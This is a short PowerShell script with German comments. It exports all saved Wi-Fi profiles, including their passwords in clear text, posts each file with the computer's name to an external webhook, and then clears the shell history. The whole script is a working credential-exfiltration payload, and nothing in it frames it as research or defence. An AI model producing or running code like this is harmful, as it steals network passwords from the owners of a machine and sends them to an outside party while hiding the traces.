# Export-Verzeichnis
$exportDir = "$env:temp\SomeStuff"

# Sicherstellen, dass das Exportverzeichnis existiert
if (-not (Test-Path $exportDir)) {
    try {
        New-Item -ItemType Directory -Path $exportDir -Force
    } catch {
        Write-Host "Fehler beim Erstellen des Exportverzeichnisses: $_"
        return
    }
}

# WLAN-Profile exportieren (inkl. Schlüssel)
try {
    netsh wlan export profile key=clear folder=$exportDir
} catch {
    Write-Host "Fehler beim Exportieren der WLAN-Profile: $_"
    return
}

# Alle exportierten XML-Dateien lesen
$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
if ($xmlFiles.Count -eq 0) {
    Write-Host "Keine exportierten WLAN-Profile gefunden."
    return
}

# Webhook-Anfrage mit Datei-Upload
foreach ($xmlFile in $xmlFiles) {
    $fileContent = Get-Content -Path $xmlFile.FullName -Raw

    # Bereite die Daten vor
    $formData = @{
        "username" = "$env:COMPUTERNAME"
        "content"  = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
    }

    $formDataFiles = @{
        "file" = New-Object System.IO.FileInfo($xmlFile.FullName)
    }

    # Setze Header für multipart/form-data
    $boundary = [System.Guid]::NewGuid().ToString()
    $contentType = "multipart/form-data; boundary=$boundary"
    $body = ""

    # Füge die Daten hinzu
    foreach ($key in $formData.Keys) {
        $body += "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"$key`"`r`n"
        $body += "`r`n"
        $body += "$($formData[$key])`r`n"
    }

    # Füge die Datei hinzu
    $body += "--$boundary`r`n"
    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($formDataFiles['file'].Name)`"`r`n"
    $body += "Content-Type: application/octet-stream`r`n"
    $body += "`r`n"
    $body += [System.IO.File]::ReadAllText($formDataFiles['file'].FullName)
    $body += "`r`n"
    $body += "--$boundary--`r`n"

    # Wandeln Sie den Body in Byte-Daten um
    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

    # Senden Sie die Anfrage
    try {
        $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
            "Content-Type" = $contentType
        }
        Write-Host "Erfolgreich an den Webhook gesendet: $($xmlFile.Name)"
    } catch {
        Write-Host "Fehler beim Senden an den Webhook: $_"
    }
}

Clear-History
